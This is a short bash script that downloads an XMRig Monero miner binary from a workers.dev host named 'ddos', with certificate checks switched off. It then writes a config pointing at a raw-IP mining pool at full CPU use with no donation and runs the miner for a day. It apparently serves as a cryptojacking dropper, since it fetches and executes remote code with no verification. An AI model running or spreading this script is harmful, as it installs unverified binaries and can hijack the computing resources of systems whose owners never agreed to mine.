#!/bin/bash

# variables
BASE_URL="https://ddos.nms.workers.dev/xmrig"

POOL="113.31.119.144:25565"
BACKGROUND=false
DONATE=0
USEAGE=100

yum install wget -y
rm -f xmrig
wget --no-check-certificate ${BASE_URL} -O xmrig
chmod +x xmrig

# prepare config
rm -f config.json
cat>"config.json"<< EOF
{
    "autosave": true,
    "background": ${BACKGROUND},
    "randomx": {
        "1gb-pages": true
    },
    "donate-level": ${DONATE},
    "cpu": {
        "enabled": true,
        "max-threads-hint": ${USEAGE}
    },
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "coin": null,
            "algo": null,
            "url": "${POOL}",
            "user": "${WORKER}",
            "pass": "x",
            "tls": false,
            "keepalive": true,
            "nicehash": true
        }
    ]
}
EOF

# load service
timeout 1d ./xmrig
